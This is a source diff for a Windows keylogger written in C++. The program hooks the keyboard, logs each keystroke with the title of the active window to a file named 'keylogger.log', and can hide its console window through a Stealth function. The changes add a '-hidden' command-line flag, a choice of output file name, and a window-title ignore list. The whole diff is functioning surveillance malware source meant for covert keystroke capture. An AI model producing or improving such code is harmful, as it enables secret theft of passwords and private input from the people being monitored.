@@ -1,4 +1,5 @@
 #define UNICODE
+#define _CRT_SECURE_NO_WARNINGS
 #include <Windows.h>
 #include <cstdio>
 #include <fstream>
@@ -6,8 +7,6 @@
 #include <sstream>
 #include <time.h>
 #include <map>
-
-#define VISIBLE 0
 
 // defines which format to use for logging
 // 0 for default, 10 for dec codes, 16 for hex codex
@@ -102,6 +101,23 @@ void ReleaseHook()
 }
 
 
+bool IgnoreWindow(const char* windowTitle)
+{
+	fclose(fopen("logignore.txt", "a"));
+
+	std::ifstream in("logignore.txt", std::ios_base::in);
+	char line[256] = "";
+
+	while (in.good())
+	{
+		in.getline(line, 256);
+
+		if (!strcmp(line, windowTitle))
+			return true;
+	}
+	return false;
+}
+
 int Save(int key_stroke)
 {
 	std::stringstream output;
@@ -127,6 +143,9 @@ int Save(int key_stroke)
 	{
 		char window_title[256];
 		GetWindowTextA(foreground, (LPSTR)window_title, 256);
+
+		if (IgnoreWindow(window_title))
+			return 0;
 
 		if (strcmp(window_title, lastwindow) != 0)
 		{
@@ -185,29 +204,39 @@ int Save(int key_stroke)
 	return 0;
 }
 
-void Stealth()
+inline void Stealth(bool hidden)
 {
-#if VISIBLE
-	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // visible window
-#else
-	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
-#endif
+	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), (int)!hidden);
 }
 
-int main()
+int main(int argc, const char** argv)
 {
-	// open output file in append mode
-	const char* output_filename = "keylogger.log";
-	std::cout << "Logging output to " << output_filename << std::endl;
-	output_file.open(output_filename, std::ios_base::app);
+	const char* outputFilename = "keylogger.log";
+	bool hidden = false;
 
-	// visibility of window
-	Stealth();
+	for (int i = 1; i < argc; i++)
+	{
+		if (!strcmp(argv[i], "-output"))
+		{
+			if (i + 1 == argc)
+			{
+				std::cout << "Please specify a name!\n";
+				return 1;
+			}
+			outputFilename = argv[++i];
+		}
+		else if (!strcmp(argv[i], "-hidden"))
+			hidden = true;
+		else
+			std::cout << "Invalid argument: " << argv[i] << '\n';
+	}
 
-	// set the hook
+	std::cout << "Logging output to " << outputFilename << std::endl;
+	output_file.open(outputFilename, std::ios_base::app);
+
+	Stealth(hidden);
 	SetHook();
 
-	// loop to keep the console application running.
 	MSG msg;
 	while (GetMessage(&msg, NULL, 0, 0));
 }
